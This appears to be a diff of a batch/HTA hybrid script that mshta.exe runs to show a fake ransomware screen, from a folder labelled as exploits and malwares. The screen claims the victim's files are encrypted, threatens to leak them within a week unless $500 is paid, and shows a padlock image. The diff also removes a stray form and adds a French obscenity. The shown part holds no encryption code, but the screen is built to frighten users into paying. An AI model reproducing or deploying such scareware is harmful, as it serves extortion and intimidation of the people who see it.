@@ -38,18 +38,9 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
     Oops, All your file get encrypted and I think they'll sended in our database in 1 week if you didn't pay 500$<br>
     <br><br>
 <br><br><br>
-<php>
-
-<form action="C:\DuckSploit\scripts\exploits\malwares\post.php" method="post">
- <p>Votre nom : <input type="text" name="nom" /></p>
- <p>Votre âge : <input type="text" name="age" /></p>
- <p><input type="submit" value="OK"></p>
-</form>
 
 
-
-
-</php>
+<h1>NIQUE TA MERE</h1>
     <br><br><br>
 <br><br><br>
     <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
